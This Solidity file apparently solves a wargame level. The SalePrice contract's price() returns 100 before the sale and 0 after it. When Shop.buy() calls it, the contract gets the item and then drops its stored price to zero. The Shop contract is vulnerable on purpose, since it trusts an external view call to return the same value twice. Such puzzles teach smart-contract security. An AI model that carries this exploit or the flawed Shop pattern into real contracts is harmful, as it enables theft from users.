
contract SalePrice {

    uint public count;

    function price() external returns (uint) {
        Shop shop = Shop(msg.sender);
        if (shop.isSold()) return 0;
        return 100;
    }

    function hack(address shopAddress) public {
        Shop shop = Shop(shopAddress);
        shop.buy();
    }


}

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}